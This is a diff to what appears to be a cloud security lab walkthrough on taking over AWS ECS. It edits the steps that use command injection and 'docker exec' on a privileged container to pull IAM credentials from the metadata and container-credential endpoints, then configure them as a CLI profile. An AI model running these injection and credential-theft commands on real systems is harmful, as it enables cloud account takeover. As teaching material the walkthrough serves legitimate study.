@@ -1322,29 +1322,21 @@ docker ps
 * Using command injection get the container credentials for the privd container.
 
 ```bash
-; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/'
+; docker exec <privd container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
 ```
 
 <p align="center">
-  <img src="/images/cloud/ecs_takeover_agent.png">
-</p>
-
-```bash
-; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<your-specific-ecs-agent>'
-```
-
-<p align="center">
-  <img src="/images/cloud/aws_ecs_keys.png">
+  <img src="/images/cloud/aws_ecs_keys1.png">
 </p>
 
 * Configure the leaked AWS credentials into a profile.
 
 ```bash
-aws configure --profile container
+aws configure --profile privd
 ```
 
 <p align="center">
-  <img src="/images/cloud/aws_configure_container.png">
+  <img src="/images/cloud/aws_configure_container1.png">
 </p>
 
 * Manually add the **SessionToken**.
@@ -1354,5 +1346,5 @@ vi .aws/credentials
 ```
 
 <p align="center">
-  <img src="/images/cloud/aws_session_container.png">
+  <img src="/images/cloud/aws_session_container1.png">
 </p>
